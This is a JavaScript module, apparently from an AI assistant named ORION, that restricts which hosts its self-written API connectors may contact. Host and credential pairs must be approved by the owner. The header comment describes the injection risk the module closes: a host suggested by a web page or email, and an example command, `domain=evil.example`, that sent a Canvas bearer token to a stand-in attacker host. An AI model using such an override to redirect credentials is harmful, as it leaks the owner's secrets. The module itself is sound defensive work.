/*
 Which host may a connector talk to, and who may change that.

 A connector is a JSON spec that ORION writes himself after reading an API's
 docs. The runner sends GET requests (and, for credentialed specs, a Keychain
 secret) to the spec's host. Nothing used to stop that host being one a web page
 or an email suggested, or a request parameter overriding the host setting
 (`run canvas courses domain=evil.example` sent the Canvas bearer token there).
 So the host is now pinned by the owner, never by the model:

   - built-in specs: their own host; a templated host (Canvas `{{domain}}`) is a
     setting, and a request parameter may not override a setting;
   - specs ORION built: run only against a host the owner allowed with
     `orion-connect-admin allow-host <name> <host>` (terminal or app only). An
     unauthenticated spec created before the pin existed keeps working.
   - changing a host-bearing setting (`orion-connect set`) is the owner's act.

 An allowance is the PAIR (host, Keychain item or "none"), not the host alone
 (review 2026-11-16): `create` overwrites a spec, so a host cleared for one
 credential could otherwise carry another connector's token. Re-creating a spec
 with a different host or item drops its allowance (allowancesAfterCreate). A
 legacy bare-host entry is migrated once, bound to the spec as it is at that
 moment; a bare host with no spec left is dropped.
*/
export const PIN_STARTED = "2026-11-16T00:00:00Z";

/** Names of settings that appear in the spec's baseUrl, i.e. that choose the host. */
export function hostSettings(spec) {
  return [...String(spec?.baseUrl ?? "").matchAll(/\{\{\s*([a-zA-Z0-9_]+)\??\s*\}\}/g)].map((m) => m[1]);
}

/** A request parameter that shadows a setting would let the model choose the host or any setting. */
export function shadowedSettings(spec, params) {
  const names = new Set(Object.keys(spec?.settings ?? {}));
  return Object.keys(params ?? {}).filter((key) => names.has(key));
}

/** The Keychain item a spec sends, or "none". */
export function keychainOf(spec) {
  const auth = spec?.auth;
  return auth && auth.type && auth.type !== "none" ? String(auth.keychain ?? "") : "none";
}

/** The literal host of a spec's baseUrl, or null when a setting chooses it. */
function literalHost(spec) {
  const base = String(spec?.baseUrl ?? "");
  if (/\{\{/.test(base)) return null;
  try { return new URL(base).host.toLowerCase(); } catch { return null; }
}

const pairOf = (entry) => (entry && typeof entry === "object" && typeof entry.host === "string" && typeof entry.keychain === "string")
  ? { host: entry.host.toLowerCase(), keychain: entry.keychain } : null;

/** { ok:true } or { ok:false, reason }. `allowed` is hosts-allowed.json: { name: [{ host, keychain }, ...] }. */
export function hostDecision({ spec, host, allowed = {} }) {
  if (!spec || !host) return { ok: false, reason: "no connector host to check" };
  if (spec.builtin) return { ok: true };
  const want = { host: String(host).toLowerCase(), keychain: keychainOf(spec) };
  const entries = Array.isArray(allowed[spec.name]) ? allowed[spec.name].map(pairOf).filter(Boolean) : [];
  if (entries.some((e) => e.host === want.host && e.keychain === want.keychain)) return { ok: true };
  const unauthenticated = want.keychain === "none";
  const created = Date.parse(spec.createdAt ?? "");
  if (unauthenticated && Number.isFinite(created) && created < Date.parse(PIN_STARTED)) return { ok: true };
  const sends = unauthenticated ? "" : ` with the Keychain item "${want.keychain}"`;
  return {
    ok: false,
    reason: `${spec.name} has not been cleared to contact ${host}${sends}. Nick has to allow it: orion-connect-admin allow-host ${spec.name} ${host}`,
  };
}

/** Bare-host entries (before pairs existed) become pairs bound to the spec as it is now. */
export function migrateAllowances(allowed, specs) {
  let changed = false;
  const next = {};
  for (const [name, list] of Object.entries(allowed ?? {})) {
    const out = [];
    for (const entry of Array.isArray(list) ? list : []) {
      if (pairOf(entry)) { out.push(entry); continue; }
      changed = true;
      const spec = specs?.get?.(name);
      if (typeof entry === "string" && spec) out.push({ host: entry.toLowerCase(), keychain: keychainOf(spec), migratedAt: new Date().toISOString() });
    }
    next[name] = out;
  }
  return { next, changed };
}

/** What survives `create` of `spec`: only pairs with the same Keychain item and, if the host is literal, the same host. */
export function allowancesAfterCreate(entries, spec) {
  const host = literalHost(spec);
  const keychain = keychainOf(spec);
  return (Array.isArray(entries) ? entries : []).filter((entry) => {
    const pair = pairOf(entry);
    return pair && pair.keychain === keychain && (host === null || pair.host === host);
  });
}
